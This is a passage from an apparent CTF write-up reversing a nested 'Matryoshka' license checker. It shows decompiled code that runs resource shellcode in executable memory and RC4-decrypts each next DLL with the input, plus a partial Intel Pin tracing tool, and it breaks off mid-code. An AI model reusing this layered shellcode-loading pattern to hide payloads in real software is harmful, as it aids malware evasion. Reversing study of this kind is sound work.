<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Stream = <span class="built_in">fopen</span>(<span class="string">&quot;license.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  Stream_1 = Stream;</span><br><span class="line">  <span class="keyword">if</span> ( !Stream )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="built_in">fseek</span>(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  ElementCount = <span class="built_in">ftell</span>(Stream_1);</span><br><span class="line">  <span class="built_in">rewind</span>(Stream_1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)ElementCount &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  Size = (<span class="type">int</span>)ElementCount + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __OFADD__(<span class="number">1</span>, (_DWORD)ElementCount) )</span><br><span class="line">    Size = <span class="number">-1</span>;</span><br><span class="line">  Buffer = <span class="built_in">malloc</span>(Size);</span><br><span class="line">  Buffer_1 = Buffer;</span><br><span class="line">  <span class="keyword">if</span> ( !Buffer )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="built_in">fclose</span>(Stream_1);</span><br><span class="line">LABEL_12:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to read license.bin\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Buffer[<span class="built_in">fread</span>(Buffer, <span class="number">1u</span>, ElementCount, Stream_1)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fclose</span>(Stream_1);</span><br><span class="line">  hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Doll.dll&quot;</span>);</span><br><span class="line">  CheckPassword = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;CheckPassword&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( CheckPassword )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> <span class="built_in">int</span> (__fastcall *)(_BYTE *))CheckPassword)(Buffer_1) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Correct license\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong license\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Could not load Doll.dll\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For the dll, it has two resources, an 1MB shellcode and a 60+MB encrypted PE file. The shellcode is a whole code block filled with obfuscate. The dll:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">CheckPassword</span><span class="params">(_OWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Src_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  Src[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  Size = <span class="number">0</span>;</span><br><span class="line">  Res = <span class="built_in">LoadRes</span>((__int64)a1, Src_1, (DWORD *)&amp;Size + <span class="number">1</span>, (<span class="type">const</span> WCHAR *)<span class="string">L&quot;MATRYOSHKA&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">LoadRes</span>(v3, Src, (DWORD *)&amp;Size, (<span class="type">const</span> WCHAR *)<span class="string">L&quot;CHECK&quot;</span>);</span><br><span class="line">  v5 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)a1 + v5) );</span><br><span class="line">  <span class="keyword">if</span> ( !v5 &amp;&amp; Res &amp;&amp; v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  Size_1 = (<span class="type">unsigned</span> <span class="type">int</span>)Size;</span><br><span class="line">  lpAddress = (__int64 (__fastcall *)(_OWORD *))<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(Size + <span class="number">1</span>), <span class="number">0x3000u</span>, <span class="number">0x40u</span>);</span><br><span class="line">  lpAddress_1 = lpAddress;</span><br><span class="line">  <span class="keyword">if</span> ( !lpAddress )</span><br><span class="line">  &#123;</span><br><span class="line">    p_Could_not_load_next_doll = <span class="string">L&quot;VirtualAlloc failed for CHECK&quot;</span>;</span><br><span class="line">LABEL_9:</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="number">0</span>, p_Could_not_load_next_doll, <span class="string">L&quot;Error&quot;</span>, <span class="number">0x10u</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(lpAddress, Src[<span class="number">0</span>], Size_1);</span><br><span class="line">  v11 = *a1;</span><br><span class="line">  v12 = a1[<span class="number">1</span>];</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v23[<span class="number">0</span>] = v11;</span><br><span class="line">  v23[<span class="number">1</span>] = v12;</span><br><span class="line">  v13 = <span class="built_in">lpAddress_1</span>(v23);</span><br><span class="line">  <span class="built_in">VirtualFree</span>(lpAddress_1, <span class="number">0</span>, <span class="number">0x8000u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  Size_2 = <span class="built_in">HIDWORD</span>(Size);</span><br><span class="line">  lpAddress_2 = <span class="built_in">malloc</span>(<span class="built_in">HIDWORD</span>(Size));</span><br><span class="line">  <span class="built_in">memcpy</span>(lpAddress_2, Src_1[<span class="number">0</span>], (<span class="type">unsigned</span> <span class="type">int</span>)Size_2);</span><br><span class="line">  hModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;advapi32&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hModule )</span><br><span class="line">    hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;advapi32&quot;</span>);</span><br><span class="line">  ProcAddress = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;SystemFunction033&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ProcAddress )</span><br><span class="line">  &#123;</span><br><span class="line">    Src_1[<span class="number">1</span>] = a1;</span><br><span class="line">    <span class="built_in">LODWORD</span>(Src_1[<span class="number">0</span>]) = <span class="number">32</span>;</span><br><span class="line">    Src[<span class="number">1</span>] = lpAddress_2;</span><br><span class="line">    <span class="built_in">LODWORD</span>(Src[<span class="number">0</span>]) = Size_2;</span><br><span class="line">    ((<span class="built_in">void</span> (__fastcall *)(<span class="type">void</span> **, <span class="type">void</span> **))ProcAddress)(Src, Src_1);</span><br><span class="line">  &#125;</span><br><span class="line">  PE = (__int64 *)<span class="built_in">LoadPE</span>((<span class="type">int</span> *)lpAddress_2, Size_2);</span><br><span class="line">  <span class="built_in">free</span>(lpAddress_2);</span><br><span class="line">  <span class="keyword">if</span> ( !PE )</span><br><span class="line">  &#123;</span><br><span class="line">    p_Could_not_load_next_doll = <span class="string">L&quot;Could not load next doll&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = (__int64 (__fastcall *)(_OWORD *))<span class="built_in">FindNextCheck</span>(PE);</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">v19</span>(a1 + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So every doll.dll uses the shellcode to check the input, and use input to decrypt next dll.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>] <span class="comment">; * 32 (strlen?)</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rcx</span>+<span class="built_in">rax</span>] <span class="comment">; → 8 byte * 4</span></span><br><span class="line"><span class="comment">; in a qword check:</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rax</span>, &lt;<span class="built_in">qword</span>&gt;</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rax</span>, &lt;<span class="built_in">qword</span>&gt;</span><br></pre></td></tr></table></figure>

<p>Because the amount of instructions is too big, try to use a pin trace script to record the change of rax and rcx in the shellcode:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pin.H&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">KNOB&lt;std::string&gt; <span class="title">KnobOut</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;E:/CTF/temp/log.txt&quot;</span>, <span class="string">&quot;output log path&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">KNOB&lt;UINT64&gt; <span class="title">KnobCallRva</span><span class="params">(KNOB_MODE_WRITEONCE, <span class="string">&quot;pintool&quot;</span>, <span class="string">&quot;call_rva&quot;</span>, <span class="string">&quot;0x120B&quot;</span>, <span class="string">&quot;RVA of &#x27;call rsi&#x27; in Doll.dll (default 0x120B)&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> ADDRINT g_callsite = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> PIN_LOCK g_lock;</span><br><span class="line"><span class="type">static</span> FILE* g_fp = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TData</span> &#123;</span><br><span class="line">    <span class="type">bool</span> in_sc = <span class="literal">false</span>;</span><br><span class="line">    ADDRINT sc_lo = <span class="number">0</span>, sc_hi = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_base = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_va_size = <span class="number">0</span>;</span><br><span class="line">    ADDRINT last_rax = (ADDRINT)<span class="number">-1</span>;</span><br><span class="line">    ADDRINT last_rcx = (ADDRINT)<span class="number">-1</span>;</span><br><span class="line">    std::string buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TLS_KEY g_tls;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> std::string <span class="title">ToLower</span><span class="params">(std::string s)</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">transform</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), s.<span class="built_in">begin</span>(), [](<span class="type">unsigned</span> <span class="type">char</span> c)&#123; <span class="built_in">return</span> (<span class="type">char</span>)std::<span class="built_in">tolower</span>(c); &#125;);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TData* <span class="title">GetTD</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">reinterpret_cast</span>&lt;TData*&gt;(<span class="built_in">PIN_GetThreadData</span>(g_tls, tid));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadStart</span><span class="params">(THREADID tid, CONTEXT* <span class="comment">/*ctxt*/</span>, INT32 <span class="comment">/*flags*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="keyword">new</span> <span class="built_in">TData</span>();</span><br><span class="line">    td-&gt;buf.<span class="built_in">reserve</span>(<span class="number">1</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">PIN_SetThreadData</span>(g_tls, td, tid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ThreadFini</span><span class="params">(THREADID tid, <span class="type">const</span> CONTEXT* <span class="comment">/*ctxt*/</span>, INT32 <span class="comment">/*code*/</span>, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (td) <span class="keyword">delete</span> td;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">FlushBuf</span><span class="params">(TData* td)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_fp || td-&gt;buf.<span class="built_in">empty</span>()) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(td-&gt;buf.<span class="built_in">data</span>(), <span class="number">1</span>, td-&gt;buf.<span class="built_in">size</span>(), g_fp);</span><br><span class="line">    <span class="built_in">fflush</span>(g_fp);</span><br><span class="line">    <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">    td-&gt;buf.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_Before</span><span class="params">(THREADID tid, ADDRINT <span class="comment">/*lpAddress*/</span>, ADDRINT dwSize, ADDRINT <span class="comment">/*flAllocationType*/</span>, ADDRINT <span class="comment">/*flProtect*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_size = dwSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">VA_After</span><span class="params">(THREADID tid, ADDRINT ret)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;last_va_base = ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">EnterShellcode</span><span class="params">(THREADID tid, ADDRINT shell_entry, ADDRINT <span class="comment">/*ip*/</span>)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td || !g_fp) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;in_sc = <span class="literal">true</span>;</span><br><span class="line">    td-&gt;last_rax = (ADDRINT)<span class="number">-1</span>;</span><br><span class="line">    td-&gt;last_rcx = (ADDRINT)<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (td-&gt;last_va_base == shell_entry &amp;&amp; td-&gt;last_va_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        td-&gt;sc_lo = td-&gt;last_va_base;</span><br><span class="line">        td-&gt;sc_hi = td-&gt;last_va_base + td-&gt;last_va_size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        td-&gt;sc_lo = shell_entry;</span><br><span class="line">        td-&gt;sc_hi = shell_entry + <span class="number">0x200000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;===== enter shellcode entry=0x%llX range=[0x%llX,0x%llX) =====\n&quot;</span>,</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell_entry,</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)td-&gt;sc_lo,</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)td-&gt;sc_hi);</span><br><span class="line">    <span class="built_in">fflush</span>(g_fp);</span><br><span class="line">    <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ExitShellcode</span><span class="params">(THREADID tid)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td || !g_fp) <span class="keyword">return</span>;</span><br><span class="line">    td-&gt;in_sc = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;===== exit shellcode =====\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(g_fp);</span><br><span class="line">    <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> ADDRINT <span class="title">ShouldLog</span><span class="params">(THREADID tid, ADDRINT ip)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!td-&gt;in_sc) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ip &lt; td-&gt;sc_lo || ip &gt;= td-&gt;sc_hi) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">LogRegs</span><span class="params">(THREADID tid, ADDRINT rax, ADDRINT rcx)</span> </span>&#123;</span><br><span class="line">    TData* td = <span class="built_in">GetTD</span>(tid);</span><br><span class="line">    <span class="keyword">if</span> (!td || !g_fp) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (rax != td-&gt;last_rax) &#123;</span><br><span class="line">        <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;rax = 0x%llX\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rax);</span><br><span class="line">        <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">        td-&gt;last_rax = rax;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rcx != td-&gt;last_rcx) &#123;</span><br><span class="line">        <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;rcx = 0x%llX\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rcx);</span><br><span class="line">        <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">        td-&gt;last_rcx = rcx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">ImageLoad</span><span class="params">(IMG img, VOID* <span class="comment">/*v*/</span>)</span> </span>&#123;</span><br><span class="line">    std::string name = <span class="built_in">ToLower</span>(<span class="built_in">IMG_Name</span>(img));</span><br><span class="line">    RTN va = <span class="built_in">RTN_FindByName</span>(img, <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RTN_Valid</span>(va)) &#123;</span><br><span class="line">        <span class="built_in">RTN_Open</span>(va);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_BEFORE, (AFUNPTR)VA_Before, IARG_THREAD_ID, IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">0</span>, IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">1</span>, IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">2</span>, IARG_FUNCARG_ENTRYPOINT_VALUE, <span class="number">3</span>, IARG_END);</span><br><span class="line">        <span class="built_in">RTN_InsertCall</span>(va, IPOINT_AFTER, (AFUNPTR)VA_After, IARG_THREAD_ID, IARG_FUNCRET_EXITPOINT_VALUE, IARG_END);</span><br><span class="line">        <span class="built_in">RTN_Close</span>(va);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name.<span class="built_in">find</span>(<span class="string">&quot;doll.dll&quot;</span>) != std::string::npos) &#123;</span><br><span class="line">        ADDRINT base = <span class="built_in">IMG_LowAddress</span>(img);</span><br><span class="line">        UINT64 rva = KnobCallRva.<span class="built_in">Value</span>();</span><br><span class="line">        g_callsite = base + (ADDRINT)rva;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">PIN_GetLock</span>(&amp;g_lock, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (g_fp) &#123;</span><br><span class="line">            std::<span class="built_in">fprintf</span>(g_fp, <span class="string">&quot;[+] Doll.dll loaded: base=0x%llX, callsite=0x%llX (rva=0x%llX)\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)base, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)g_callsite, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rva);</span><br><span class="line">            std::<span class="built_in">fflush</span>(g_fp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">PIN_ReleaseLock</span>(&amp;g_lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> VOID <span class="title">Instruction</span><span class="params">(INS ins, VOID* <span 